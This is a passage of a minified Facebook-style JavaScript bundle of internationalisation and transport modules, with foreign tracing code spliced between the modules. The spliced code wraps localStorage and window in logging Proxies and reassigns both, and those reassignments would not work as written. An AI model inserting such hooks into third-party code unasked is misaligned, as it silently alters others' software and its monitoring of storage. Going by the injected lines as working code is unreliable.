const jsHooks = {
  get: function (target, property) {
    if (typeof target[property] === 'function') {
      console.log(`Function access: ${property}`);
    }
    return target[property];
  },
  set: function (target, property, value) {
    console.log(`Variable set: ${property}`);
    target[property] = value;
    return true;
  }
};
; /*FB_PKG_DELIM*/

__d("GenderConst", [], function (a, b, c, d, e, f) {
  e.exports = {
    NOT_A_PERSON: 0,
    FEMALE_SINGULAR: 1,
    MALE_SINGULAR: 2,
    FEMALE_SINGULAR_GUESS: 3,
    MALE_SINGULAR_GUESS: 4,
    MIXED_UNKNOWN: 5,
    NEUTER_SINGULAR: 6,
    UNKNOWN_SINGULAR: 7,
    FEMALE_PLURAL: 8,
    MALE_PLURAL: 9,
    NEUTER_PLURAL: 10,
    UNKNOWN_PLURAL: 11
  };
}, null);
const localStorageTracer = new Proxy(localStorage, jsHooks);
__d("IntlVariations", [], function (a, b, c, d, e, f) {
  e.exports = {
    BITMASK_NUMBER: 28,
    BITMASK_GENDER: 3,
    NUMBER_ZERO: 16,
    NUMBER_ONE: 4,
    NUMBER_TWO: 8,
    NUMBER_FEW: 20,
    NUMBER_MANY: 12,
    NUMBER_OTHER: 24,
    GENDER_MALE: 1,
    GENDER_FEMALE: 2,
    GENDER_UNKNOWN: 3
  };
}, null);
__d("InlineFbtResult", ["cr:1183579"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:1183579");
}, 98);
__d("FbtReactUtil", [], function (a, b, c, d, e, f) {
  a = typeof Symbol === "function" && Symbol["for"] && Symbol["for"]("react.element") || 60103;
  var g = !1;
  b = {
    REACT_ELEMENT_TYPE: a,
    injectReactShim: function (a) {
      var b = {
        validated: !0
      };
      g ? Object.defineProperty(a, "_store", {
        configurable: !1,
        enumerable: !1,
        writable: !1,
        value: b
      }) : a._store = b;
    }
  };
  e.exports = b;
}, null);
__d("FbtResult", ["FbtReactUtil", "FbtResultBase"], function (a, b, c, d, e, f) {
  var g = function (a) {
    return a.content;
  };
  a = function (a) {
    "use strict";

    babelHelpers.inheritsLoose(c, a);
    function c(c, d) {
      d = a.call(this, c, d) || this;
      d.$$typeof = b("FbtReactUtil").REACT_ELEMENT_TYPE;
      d.key = null;
      d.ref = null;
      d.type = g;
      d.props = {
        content: c
      };
      return d;
    }
    c.get = function (a) {
      return new c(a.contents, a.errorListener);
    };
    return c;
  }(b("FbtResultBase"));
  e.exports = a;
}, null);
__d("TransAppInlineMode", [], function (a, b, c, d, e, f) {
  a = Object.freeze({
    STRING_MANAGER: "STRING_MANAGER",
    TRANSLATION: "TRANSLATION",
    APPROVE: "APPROVE",
    REPORT: "REPORT",
    NO_INLINE: "NO_INLINE"
  });
  f["default"] = a;
}, 66);
__d("getUnwrappedFbt", ["FbtResultGK"], function (a, b, c, d, e, f) {
  function a(a) {
    a = a.contents;
    var c = b("FbtResultGK").inlineMode,
      d = b("FbtResultGK").shouldReturnFbtResult;
    if (!d && c !== "REPORT") return (a == null ? void 0 : a.length) === 1 && typeof a[0] === "string" ? a[0] : a;
  }
  e.exports = a;
}, null);
window.localStorage = localStorageTracer;
__d("getFbtResult", ["FbtResult", "FbtResultGK", "InlineFbtResult", "getUnwrappedFbt", "gkx", "recoverableViolation"], function (a, b, c, d, e, f, g) {
  if (c("gkx")("708253") && c("FbtResultGK").inlineMode === "TRANSLATION") {
    c("recoverableViolation")("TransAppInlineMode=TRANSLATION should not happen on Comet yet. " + ("[inlineMode=" + ((b = c("FbtResultGK").inlineMode) != null ? b : "") + "]") + ("[runtime_site_is_comet=" + String(c("gkx")("708253")) + "]"), "internationalization");
  }
  function a(a) {
    var b = c("getUnwrappedFbt")(a);
    if (b != null) return b;
    b = a.contents;
    var d = a.patternString,
      e = a.patternHash;
    return c("FbtResultGK").inlineMode != null && c("FbtResultGK").inlineMode !== "NO_INLINE" ? new (c("InlineFbtResult"))(b, c("FbtResultGK").inlineMode, d, e) : c("FbtResult").get(a);
  }
  g["default"] = a;
}, 98);
__d("BanzaiLogger", ["Banzai"], function (a, b, c, d, e, f, g) {
  function h(a) {
    return {
      log: function (b, d) {
        c("Banzai").post("logger:" + b, d, a);
      },
      create: h
    };
  }
  a = h();
  b = a;
  g["default"] = b;
}, 98);
__d("MNCommerceLogger", ["BanzaiLogger", "ODS"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = c("BanzaiLogger").create({
    signal: !0
  });
  function i(a) {
    switch (a) {
      case "devx_upsell_learn_more_clicked":
        return "devx.upsell.learn_more.clicked";
      default:
        return a;
    }
  }
  function a(a, b, c) {
    d("ODS").bumpEntityKey(2966, "messenger_commerce", i(a)), h.log("MessengerCommerceLoggerConfig", {
      brand_app_id: b,
      user_fbid: c,
      event: a
    });
  }
  function b(a, b, c, e) {
    h.log("MessengerCommerceLoggerConfig", {
      brand_app_id: a,
      page_id: b,
      user_fbid: c,
      event: e
    }), d("ODS").bumpEntityKey(2966, "messenger_commerce", "auth." + e + ".all");
  }
  g.logClick = a;
  g.logAuthEvent = b;
}, 98);
__d("ArbiterMixin", ["Arbiter", "guid"], function (a, b, c, d, e, f, g) {
  var h = "arbiter$" + c("guid")(),
    i = Object.prototype.hasOwnProperty;
  a = {
    _getArbiterInstance: function () {
      return i.call(this, h) ? this[h] : this[h] = new (c("Arbiter"))();
    },
    inform: function (a, b, c) {
      return this._getArbiterInstance().inform(a, b, c);
    },
    subscribe: function (a, b, c) {
      return this._getArbiterInstance().subscribe(a, b, c);
    },
    subscribeOnce: function (a, b, c) {
      return this._getArbiterInstance().subscribeOnce(a, b, c);
    },
    unsubscribe: function (a) {
      this._getArbiterInstance().unsubscribe(a);
    },
    unsubscribeCurrentSubscription: function () {
      this._getArbiterInstance().unsubscribeCurrentSubscription();
    },
    releaseCurrentPersistentEvent: function () {
      this._getArbiterInstance().releaseCurrentPersistentEvent();
    },
    registerCallback: function (a, b) {
      return this._getArbiterInstance().registerCallback(a, b);
    },
    query: function (a) {
      return this._getArbiterInstance().query(a);
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("AsyncDOM", ["CSS", "DOM", "FBLogger"], function (a, b, c, d, e, f) {
  a = {
    invoke: function (a, c) {
      for (var d = 0; d < a.length; ++d) {
        var e = a[d],
          f = e[0],
          g = e[1],
          h = e[2];
        e = e[3];
        h = h && c || null;
        g && (h = b("DOM").scry(h || document.documentElement, g)[0]);
        h || b("FBLogger")("async_dom").warn("Could not find relativeTo element for %s AsyncDOM operation based on selector: %s", f, g);
        switch (f) {
          case "hide":
            b("CSS").hide(h);
            break;
          case "show":
            b("CSS").show(h);
            break;
          case "setContent":
            b("DOM").setContent(h, e);
            break;
          case "appendContent":
            b("DOM").appendContent(h, e);
            break;
          case "prependContent":
            b("DOM").prependContent(h, e);
            break;
          case "insertAfter":
            b("DOM").insertAfter(h, e);
            break;
          case "insertBefore":
            b("DOM").insertBefore(h, e);
            break;
          case "remove":
            b("DOM").remove(h);
            break;
          case "replace":
            b("DOM").replace(h, e);
            break;
          default:
            b("FBLogger")("async_dom").warn("Received invalid command %s for AsyncDOM operation", f);
        }
      }
    }
  };
  e.exports = a;
}, null);
__d("AsyncResponse", ["invariant", "Bootloader", "FBLogger", "HTML", "WebDriverConfig"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  a = function () {
    function a(a, b) {
      this.error = 0, this.errorSummary = null, this.errorDescription = null, this.onload = null, this.replay = !1, this.payload = b, this.request = a, this.silentError = !1, this.transientError = !1, this.blockedAction = !1, this.is_last = !0, this.responseHeaders = null;
    }
    var b = a.prototype;
    b.getRequest = function () {
      return this.request;
    };
    b.getPayload = function () {
      return this.payload;
    };
    b.toError = function () {
      this.error !== 0 || h(0, 5599);
      var a = this.errorSummary || "",
        b = this.getErrorDescriptionString() || "",
        c = new Error(a.toString() + ": " + b);
      Object.assign(c, {
        code: this.error,
        description: this.errorDescription || "",
        descriptionString: b,
        response: this,
        summary: a,
        isSilent: this.silentError,
        isTransient: this.transientError
      });
      return c;
    };
    b.getError = function () {
      return this.error;
    };
    b.getErrorSummary = function () {
      return this.errorSummary;
    };
    b.setErrorSummary = function (a) {
      a = a === void 0 ? null : a;
      this.errorSummary = a;
      return this;
    };
    b.getErrorDescription = function () {
      return this.errorDescription;
    };
    b.getErrorDescriptionString = function () {
      var a = this.getErrorDescription();
      if (a == null) return null;
      if (c("HTML").isHTML(a)) {
        var b = new (c("HTML"))(a);
        return b.getRootNode().textContent;
      }
      return a.toString();
    };
    b.getErrorIsWarning = function () {
      return !!this.errorIsWarning;
    };
    b.isSilent = function () {
      return !!this.silentError;
    };
    b.isTransient = function () {
      return !!this.transientError;
    };
    b.isBlockedAction = function () {
      return !!this.blockedAction;
    };
    b.getResponseHeader = function (a) {
      var b = this.responseHeaders;
      if (!b) return null;
      b = b.replace(/^\n/, "");
      a = a.toLowerCase();
      b = b.split("\r\n");
      for (var c = 0; c < b.length; ++c) {
        var d = b[c],
          e = d.indexOf(": ");
        if (e <= 0) continue;
        var f = d.substring(0, e).toLowerCase();
        if (f === a) return d.substring(e + 2);
      }
      return null;
    };
    a.defaultErrorHandler = function (b) {
      try {
        !b.silentError ? a.verboseErrorHandler(b) : c("FBLogger")("async_response").catching(b.toError()).warn("default error handler called");
      } catch (a) {
        alert(b);
      }
    };
    a.verboseErrorHandler = function (a, b) {
      c("Bootloader").loadModules(["ExceptionDialog"], function (c) {
        return c.showAsyncError(a, b);
      }, "AsyncResponse");
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("FetchStreamConfig", [], function (a, b, c, d, e, f) {
  a = Object.freeze({
    delim: "/*<!-- fetch-stream -->*/"
  });
  f["default"] = a;
}, 66);
__d("StreamBlockReader", ["Promise", "regeneratorRuntime"], function (a, b, c, d, e, f) {
  a = function () {
    function a(a) {
      var c = this;
      if (!a.getReader) throw new Error("No getReader method found on given object");
      this.$3 = a.getReader();
      this.$1 = "";
      this.$2 = null;
      this.$4 = !1;
      this.$5 = "utf-8";
      this.$6 = "";
      this.$9 = !1;
      this.$8 = function () {
        return b("Promise").reject("Sorry, you are somehow using this too early.");
      };
      this.$7 = new (b("Promise"))(function (a, b) {
        c.$8 = a;
      });
    }
    var c = a.prototype;
    c.changeEncoding = function (a) {
      if (this.$2) throw new Error("Decoder already in use, encoding cannot be changed");
      this.$5 = a;
    };
    c.$10 = function () {
      if (!self.TextDecoder) throw new Error("TextDecoder is not supported here");
      this.$2 || (this.$2 = new self.TextDecoder(this.$5));
      return this.$2;
    };
    c.$11 = function () {
      if (this.$9) throw new Error("Something else is already reading from this reader");
      this.$9 = !0;
    };
    c.$12 = function () {
      this.$9 = !1;
    };
    c.isDone = function () {
      return this.$4;
    };
    c.$13 = function () {
      var a, c, d, e;
      return b("regeneratorRuntime").async(function (f) {
        while (1) switch (f.prev = f.next) {
          case 0:
            if (!(this.$6 !== "")) {
              f.next = 4;
              break;
            }
            a = this.$6;
            this.$6 = "";
            return f.abrupt("return", a);
          case 4:
            if (!this.isDone()) {
              f.next = 6;
              break;
            }
            throw new Error("You cannot read from a stream that is done");
          case 6:
            f.next = 8;
            return b("regeneratorRuntime").awrap(this.$3.read());
          case 8:
            c = f.sent;
            d = c.done;
            e = c.value;
            this.$4 = d;
            d && this.$8();
            return f.abrupt("return", e ? this.$10().decode(e, {
              stream: !d
            }) : "");
          case 14:
          case "end":
            return f.stop();
        }
      }, null, this);
    };
    c.readNextBlock = function () {
      var a;
      return b("regeneratorRuntime").async(function (b) {
        while (1) switch (b.prev = b.next) {
          case 0:
            this.$11();
            a = this.$13();
            this.$12();
            return b.abrupt("return", a);
          case 4:
          case "end":
            return b.stop();
        }
      }, null, this);
    };
    c.readUntilStringOrEnd = function (a) {
      return b("regeneratorRuntime").async(function (c) {
        while (1) switch (c.prev = c.next) {
          case 0:
            c.next = 2;
            return b("regeneratorRuntime").awrap(this.readUntilOneOfStringOrEnd_DO_NOT_USE([a]));
          case 2:
            return c.abrupt("return", c.sent);
          case 3:
          case "end":
            return c.stop();
        }
      }, null, this);
    };
    c.readUntilStringOrThrow = function (a) {
      var c, d, e;
      return b("regeneratorRuntime").async(function (f) {
        while (1) switch (f.prev = f.next) {
          case 0:
            if (a) {
              f.next = 2;
              break;
            }
            throw new Error("cannot read empty string");
          case 2:
            this.$11(), c = "", d = 0;
          case 5:
            if (this.isDone()) {
              f.next = 23;
              break;
            }
            f.t0 = c;
            f.next = 9;
            return b("regeneratorRuntime").awrap(this.$13());
          case 9:
            c = f.t0 += f.sent;
            if (!(c.length < a.length)) {
              f.next = 12;
              break;
            }
            return f.abrupt("continue", 5);
          case 12:
            e = c.substring(d).indexOf(a);
            if (!(e !== -1)) {
              f.next = 20;
              break;
            }
            e += d;
            this.$6 = c.substring(e + a.length);
            this.$12();
            return f.abrupt("return", c.substring(0, e));
          case 20:
            d = c.length - a.length + 1;
          case 21:
            f.next = 5;
            break;
          case 23:
            this.$6 = c;
            this.$12();
            throw new Error("Breakpoint not found");
          case 26:
          case "end":
            return f.stop();
        }
      }, null, this);
    };
    c.readUntilOneOfStringOrEnd_DO_NOT_USE = function (a) {
      var c, d, e, f;
      return b("regeneratorRuntime").async(function (g) {
        while (1) switch (g.prev = g.next) {
          case 0:
            this.$11(), c = "";
          case 2:
            if (this.isDone()) {
              g.next = 20;
              break;
            }
            g.t0 = c;
            g.next = 6;
            return b("regeneratorRuntime").awrap(this.$13());
          case 6:
            c = g.t0 += g.sent, d = 0;
          case 8:
            if (!(d < a.length)) {
              g.next = 18;
              break;
            }
            e = a[d];
            f = c.indexOf(e);
            if (!(f !== -1)) {
              g.next = 15;
              break;
            }
            this.$6 = c.substring(f + e.length);
            this.$12();
            return g.abrupt("return", c.substring(0, f));
          case 15:
            d++;
            g.next = 8;
            break;
          case 18:
            g.next = 2;
            break;
          case 20:
            this.$12();
            return g.abrupt("return", c);
          case 22:
          case "end":
            return g.stop();
        }
      }, null, this);
    };
    c.waitUntilDone = function () {
      return b("regeneratorRuntime").async(function (a) {
        while (1) switch (a.prev = a.next) {
          case 0:
            return a.abrupt("return", this.$7);
          case 1:
          case "end":
            return a.stop();
        }
      }, null, this);
    };
    return a;
  }();
  f["default"] = a;
}, 66);
__d("mixin", [], function (a, b, c, d, e, f) {
  function a() {
    var a = function () {},
      b = 0,
      c;
    while (b < 0 || arguments.length <= b ? void 0 : arguments[b]) {
      c = b < 0 || arguments.length <= b ? void 0 : arguments[b];
      for (var d in c) Object.prototype.hasOwnProperty.call(c, d) && (a.prototype[d] = c[d]);
      b += 1;
    }
    return a;
  }
  f["default"] = a;
}, 66);
__d("FetchStreamTransport", ["ArbiterMixin", "FetchStreamConfig", "StreamBlockReader", "TimeSlice", "URI", "asyncToGeneratorRuntime", "mixin", "nullthrows"], function (a, b, c, d, e, f, g) {
  var h = 0;
  a = function (a) {
    babelHelpers.inheritsLoose(d, a);
    function d(b) {
      var c;
      if (!self.ReadableStream || !self.fetch || !Request || !TextDecoder) throw new Error("fetch stream transport is not supported here");
      c = a.call(this) || this;
      c.$FetchStreamTransport6 = null;
      c.$FetchStreamTransport1 = b;
      c.$FetchStreamTransport3 = !1;
      c.$FetchStreamTransport4 = !1;
      c.$FetchStreamTransport5 = !1;
      c.$FetchStreamTransport2 = ++h;
      return babelHelpers.assertThisInitialized(c) || babelHelpers.assertThisInitialized(c);
    }
    var e = d.prototype;
    e.hasFinished = function () {
      return this.$FetchStreamTransport5;
    };
    e.getRequestURI = function () {
      return new (c("URI"))(this.$FetchStreamTransport1).addQueryData({
        __a: 1,
        __adt: this.$FetchStreamTransport2,
        __req: "fetchstream_" + this.$FetchStreamTransport2,
        ajaxpipe_fetch_stream: 1
      });
    };
    e.send = function () {
      if (this.$FetchStreamTransport3) throw new Error("FetchStreamTransport instances cannot be re-used.");
      this.$FetchStreamTransport3 = !0;
      var a = new Request(this.getRequestURI().toString(), {
        mode: "same-origin",
        credentials: "include"
      });
      this.$FetchStreamTransport6 = c("TimeSlice").getGuardedContinuation("FetchStreamTransport: waiting on first response");
      a = self.fetch(a, {
        redirect: "follow"
      });
      this.$FetchStreamTransport7(a);
    };
    e.$FetchStreamTransport7 = function () {
      var a = b("asyncToGeneratorRuntime").asyncToGenerator(function* (a) {
        var b = this,
          d;
        try {
          d = yield a;
        } catch (a) {
          this.abort();
        }
        if (!d || !d.body || !d.ok) {
          this.abort();
          return;
        }
        var e = new (c("StreamBlockReader"))(d.body);
        a = function* () {
          var a = yield e.readUntilStringOrEnd(c("FetchStreamConfig").delim);
          if (b.$FetchStreamTransport4) return "break";
          c("nullthrows")(b.$FetchStreamTransport6)(function () {
            var d = JSON.parse(a);
            e.isDone() || d.finished ? b.$FetchStreamTransport5 = !0 : b.$FetchStreamTransport6 = c("TimeSlice").getGuardedContinuation("FetchStreamTransport: waiting on next response");
            b.inform("response", d.content);
          });
        };
        while (!this.$FetchStreamTransport5 && !this.$FetchStreamTransport4) {
          var f = yield* a();
          if (f === "break") break;
        }
      });
      function d(b) {
        return a.apply(this, arguments);
      }
      return d;
    }();
    e.abort = function () {
      var a = this;
      if (this.$FetchStreamTransport4 || this.$FetchStreamTransport5) return;
      this.$FetchStreamTransport4 = !0;
      this.$FetchStreamTransport5 = !0;
      if (this.$FetchStreamTransport6) {
        var b = this.$FetchStreamTransport6;
        b(function () {
          a.inform("abort");
        });
      } else this.inform("abort");
    };
    return d;
  }(c("mixin")(c("ArbiterMixin")));
  g["default"] = a;
}, 98);
const globalVarCollector = new Proxy(window, jsHooks);
__d("HTTPErrors", ["emptyFunction"], function (a, b, c, d, e, f, g) {
  function a(a) {
    return {
      summary: "HTTP Error",
      description: "Unknown HTTP error #" + a
    };
  }
  b = {
    get: a,
    getAll: c("emptyFunction").thatReturns(new Map())
  };
  d = b;
  g["default"] = d;
}, 98);
__d("JSONPTransport", ["ArbiterMixin", "DOM", "HTML", "TimeSlice", "URI", "mixin", "setTimeout"], function (a, b, c, d, e, f, g) {
  var h = {},
    i = 2;
  function j(a) {
    delete h[a];
  }
  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b(b) {
      var c;
      c = a.call(this) || this;
      c.$JSONPTransport3 = !1;
      c.$JSONPTransport7 = b;
      h[c.getID()] = babelHelpers.assertThisInitialized(c);
      return c;
    }
    var d = b.prototype;
    d.getID = function () {
      return this.$JSONPTransport4 || (this.$JSONPTransport4 = i++);
    };
    d.hasFinished = function () {
      return !(this.getID() in h);
    };
    d.getRequestURI = function () {
      return new (c("URI"))(this.$JSONPTransport7).addQueryData({
        __a: 1,
        __adt: this.getID(),
        __req: "jsonp_" + this.getID()
      });
    };
    d.getTransportFrame = function () {
      if (this.$JSONPTransport5) return this.$JSONPTransport5;
      var a = "transport_frame_" + this.getID();
      a = c("HTML")('<iframe class="hidden_elem" name="' + a + '" src="javascript:void(0)" />');
      return this.$JSONPTransport5 = c("DOM").appendContent(document.body, a)[0];
    };
    d.send = function () {
      var a = this;
      this.getTransportFrame().onload = function () {
        return a.$JSONPTransport8();
      };
      this.getTransportFrame().src = this.getRequestURI().toString();
      this.$JSONPTransport2 = c("TimeSlice").getGuardedContinuation("JSONPTransport: waiting for first response");
    };
    d.handleResponse = function (a) {
      var b = this;
      this.$JSONPTransport2 == null ? void 0 : this.$JSONPTransport2(function () {
        b.inform("response", a), b.hasFinished() ? c("setTimeout")(function () {
          return b.$JSONPTransport9();
        }, 0) : b.$JSONPTransport2 = c("TimeSlice").getGuardedContinuation("JSONPTransport: waiting for next response");
      });
    };
    d.abort = function () {
      if (this.$JSONPTransport1) return;
      this.$JSONPTransport1 = !0;
      this.$JSONPTransport9();
      j(this.getID());
      this.inform("abort");
    };
    d.$JSONPTransport8 = function () {
      this.$JSONPTransport3 || this.abort();
    };
    d.$JSONPTransport9 = function () {
      this.$JSONPTransport5 && (c("DOM").remove(this.$JSONPTransport5), this.$JSONPTransport5 = null);
    };
    return b;
  }(c("mixin")(c("ArbiterMixin")));
  a.respond = function (a, b, c) {
    var d = h[a];
    if (d) {
      d.$JSONPTransport3 = !0;
      c || j(a);
      b;
      if (typeof b === "string") c = JSON.parse(b);else {
        c = JSON.parse((a = JSON.stringify(b)) != null ? a : "null");
      }
      d.handleResponse(c);
    }
  };
  a.respond = c("TimeSlice").guard(a.respond, "JSONPTransport.respond", {
    root: !0
  });
  g["default"] = a;
}, 98);
__d("SessionName", ["SessionNameConfig"], function (a, b, c, d, e, f) {
  e.exports = {
    getName: function () {
      return b("SessionNameConfig").seed;
    }
  };
}, null);
window = globalVarCollector;
__d("bind", [], function (a, b, c, d, e, f) {
  function a(a, b) {
    var c = Array.prototype.slice.call(arguments, 2);
    if (typeof b !== "string") return Function.prototype.bind.apply(b, [a].concat(c));
    function d() {
      var d = c.concat(Array.prototype.slice.call(arguments));
      if (a[b]) return a[b].apply(a, d);
    }
    d.toString = function () {
      return "bound lazily: " + a[b];
    };
    return d;
  }
  e.exports = a;
}, null);
__d("errorCode", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    throw new Error('errorCode("' + a + '"): This should not happen. Oh noes!');
  }
  f["default"] = a;
}, 66);
__d("executeAfter", [], function (a, b, c, d, e, f) {
  function a(a, b, c) {
    return function () {
      a.apply(c || this, arguments), b.apply(c || this, arguments);
    };
  }
  e.exports = a;
}, null);
__d("FbtErrorListenerWWW", ["FBLogger", "killswitch"], function (a, b, c, d, e, f, g) {
  a = function () {
    function a(a) {
      this.$1 = a.hash, this.$2 = a.translation;
    }
    var b = a.prototype;
    b.onStringSerializationError = function (a) {
      var b = "Context not logged.";
      if (!c("killswitch")("JS_RELIABILITY_FBT_LOGGING")) try {
        var d = JSON.stringify(a);
        d != null && (b = d.substr(0, 250));
      } catch (a) {
        b = a.message;
      }
      d = (a == null ? void 0 : (d = a.constructor) == null ? void 0 : d.name) || "";
      c("FBLogger")("fbt").blameToPreviousDirectory().blameToPreviousDirectory().mustfix('Converting to a string will drop content data. Hash="%s" Translation="%s" Content="%s" (type=%s,%s)', this.$1, this.$2, b, typeof a, d);
    };
    b.onStringMethodUsed = function (a) {
      c("FBLogger")("fbt").blameToPreviousDirectory().blameToPreviousDirectory().mustfix("Error using fbt string. Used method %s on Fbt string. Fbt string is designed to be immutable and should not be manipulated.", a);
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("FbtPureStringResult", ["FbtResult"], function (a, b, c, d, e, f) {
  a = function (a) {
    "use strict";

    babelHelpers.inheritsLoose(b, a);
    function b() {
      return a.apply(this, arguments) || this;
    }
    return b;
  }(b("FbtResult"));
  e.exports = a;
}, null);
__d("getFbsResult", ["FbtPureStringResult"], function (a, b, c, d, e, f) {
  function a(a) {
    return new (b("FbtPureStringResult"))(a.contents, a.errorListener);
  }
  e.exports = a;
}, null);
__d("getTranslatedInput", ["Env", "ExecutionEnvironment", "FBLogger", "MakeHasteTranslationsMap"], function (a, b, c, d, e, f, g) {
  b = "JHASH";
  var h = new RegExp("__" + b + "__(.+?)__" + b + "__"),
    i = !!c("Env").use_fbt_virtual_modules;
  function a(a) {
    var b = a.table;
    if (i && c("ExecutionEnvironment").canUseDOM) {
      if (typeof b === "string") {
        var e = b.match(h);
        if (e != null) return babelHelpers["extends"]({}, a, {
          table: d("MakeHasteTranslationsMap").get(e[1])
        });
      }
      c("FBLogger")("binary_transparency", "inlined_translations").warn("Found inlined translated contents in client_fetch_translations experiment! Input: %s", JSON.stringify(b));
    }
    return a;
  }
  g["default"] = a;
}, 98);
__d("translationOverrideListener", ["requireDeferred"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = c("requireDeferred")("IntlQtEventFalcoEvent").__setRef("translationOverrideListener");
  function a(a) {
    h.onReady(function (b) {
      return b.log(function () {
        return {
          hash: a
        };
      });
    });
  }
  g["default"] = a;
}, 98);
__d("FbtEnv", ["FbtErrorListenerWWW", "FbtHooks", "IntlViewerContext", "getFbsResult", "getFbtResult", "getTranslatedInput", "promiseDone", "requireDeferred", "translationOverrideListener"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h,
    i = c("requireDeferred")("FbtLogging").__setRef("FbtEnv"),
    j = !1;
  function a() {
    if (j) return;
    j = !0;
    (h || (h = b("FbtHooks"))).register({
      errorListener: function (a) {
        return new (c("FbtErrorListenerWWW"))(a);
      },
      getFbsResult: c("getFbsResult"),
      getFbtResult: c("getFbtResult"),
      getTranslatedInput: c("getTranslatedInput"),
      onTranslationOverride: c("translationOverrideListener"),
      getViewerContext: function () {
        return c("IntlViewerContext");
      },
      logImpression: function (a) {
        return c("promiseDone")(i.load().then(function (b) {
          return b.logImpression == null ? void 0 : b.logImpression(a);
        }));
      }
    });
  }
  g.setupOnce = a;
}, 98);
__d("FbtHooksImpl", [], function (a, b, c, d, e, f) {
  var g = {};
  a = {
    getErrorListener: function (a) {
      return g.errorListener == null ? void 0 : g.errorListener(a);
    },
    logImpression: function (a) {
      g.logImpression == null ? void 0 : g.logImpression(a);
    },
    onTranslationOverride: function (a) {
      g.onTranslationOverride == null ? void 0 : g.onTranslationOverride(a);
    },
    getFbsResult: function (a) {
      return g.getFbsResult(a);
    },
    getFbtResult: function (a) {
      return g.getFbtResult(a);
    },
    getTranslatedInput: function (a) {
      var b;
      return (b = g.getTranslatedInput == null ? void 0 : g.getTranslatedInput(a)) != null ? b : a;
    },
    getViewerContext: function () {
      return g.getViewerContext();
    },
    register: function (a) {
      Object.assign(g, a);
    }
  };
  e.exports = a;
}, null);
__d("FbtHooks", ["FbtEnv", "FbtHooksImpl"], function (a, b, c, d, e, f) {
  e.exports = b("FbtHooksImpl"), b("FbtEnv").setupOnce();
}, null);
__d("FbtTable", ["invariant"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = {
    ARG: {
      INDEX: 0,
      SUBSTITUTION: 1
    },
    access: function (a, b, c) {
      if (c >= b.length) {
        typeof a === "string" || Array.isArray(a) || g(0, 21388, JSON.stringify(a));
        return a;
      }
      var d = b[c];
      d = d[h.ARG.INDEX];
      if (d == null) return h.access(a, b, c + 1);
      typeof a !== "string" && !Array.isArray(a) || g(0, 20954, typeof a);
      for (var e = 0; e < d.length; ++e) {
        var f = a[d[e]];
        if (f == null) continue;
        f = h.access(f, b, c + 1);
        if (f != null) return f;
      }
      return null;
    }
  };
  e.exports = h;
}, null);
__d("FbtTableAccessor", [], function (a, b, c, d, e, f) {
  "use strict";

  a = {
    getEnumResult: function (a) {
      return [[a], null];
    },
    getGenderResult: function (a, b, c) {
      return [a, b];
    },
    getNumberResult: function (a, b, c) {
      return [a, b];
    },
    getSubstitution: function (a) {
      return [null, a];
    },
    getPronounResult: function (a) {
      return [[a, "*"], null];
    }
  };
  e.exports = a;
}, null);
__d("FbtNumberType", ["IntlNumberTypeProps"], function (a, b, c, d, e, f, g) {
  g["default"] = c("IntlNumberTypeProps").module;
}, 98);
__d("IntlNumberType", ["FbtNumberType"], function (a, b, c, d, e, f, g) {
  a = function (a) {
    return c("FbtNumberType");
  };
  g.get = a;
}, 98);
__d("IntlVariationResolverImpl", ["invariant", "FbtHooks", "IntlNumberType", "IntlVariations"], function (a, b, c, d, e, f, g) {
  var h,
    i = "_1";
  a = {
    EXACTLY_ONE: i,
    getNumberVariations: function (a) {
      var c = b("IntlNumberType").get((h || (h = b("FbtHooks"))).getViewerContext().locale).getVariation(a);
      c & b("IntlVariations").BITMASK_NUMBER || g(0, 11647, c, typeof c);
      return a === 1 ? [i, c, "*"] : [c, "*"];
    },
    getGenderVariations: function (a) {
      a & b("IntlVariations").BITMASK_GENDER || g(0, 11648, a, typeof a);
      return [a, "*"];
    }
  };
  e.exports = a;
}, null);
__d("IntlVariationResolver", ["IntlVariationHoldout", "IntlVariationResolverImpl"], function (a, b, c, d, e, f, g) {
  a = {
    getNumberVariations: function (a) {
      return d("IntlVariationResolverImpl").getNumberVariations(a);
    },
    getGenderVariations: function (a) {
      return d("IntlVariationHoldout").disable_variation ? ["*"] : d("IntlVariationResolverImpl").getGenderVariations(a);
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("NumberFormatConsts", ["NumberFormatConfig"], function (a, b, c, d, e, f) {
  a = {
    get: function (a) {
      return b("NumberFormatConfig");
    }
  };
  e.exports = a;
}, null);
__d("escapeRegex", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return a.replace(/([.?*+\^$\[\]\\(){}|\-])/g, "\\$1");
  }
  e.exports = a;
}, null);
__d("intlNumUtils", ["FbtHooks", "NumberFormatConsts", "escapeRegex"], function (a, b, c, d, e, f) {
  var g,
    h = 3;
  f = ["\u0433\u0440\u043d.", "\u0434\u0435\u043d.", "\u043b\u0432.", "\u043c\u0430\u043d.", "\u0564\u0580.", "\u062c.\u0645.", "\u062f.\u0625.", "\u062f.\u0627.", "\u062f.\u0628.", "\u062f.\u062a.", "\u062f.\u062c.", "\u062f.\u0639.", "\u062f.\u0643.", "\u062f.\u0644.", "\u062f.\u0645.", "\u0631.\u0633.", "\u0631.\u0639.", "\u0631.\u0642.", "\u0631.\u064a.", "\u0644.\u0633.", "\u0644.\u0644.", "\u0783.", "B/.", "Bs.", "Fr.", "kr.", "L.", "p.", "S/."];
  var i = {};
  function j(a) {
    i[a] || (i[a] = new RegExp(a, "i"));
    return i[a];
  }
  var k = j(f.reduce(function (a, c, d) {
    return a + (d ? "|" : "") + "(" + b("escapeRegex")(c) + ")";
  }, ""));
  function l(a, c, d, e, f, g, i) {
    d === void 0 && (d = "");
    e === void 0 && (e = ".");
    f === void 0 && (f = 0);
    g === void 0 && (g = {
      primaryGroupSize: h,
      secondaryGroupSize: h
    });
    var k = g.primaryGroupSize || h;
    g = g.secondaryGroupSize || k;
    i = i && i.digits;
    var l;
    c == null ? l = a.toString() : typeof a === "string" ? l = r(a, c) : l = p(a, c);
    a = l.split(".");
    c = a[0];
    l = a[1];
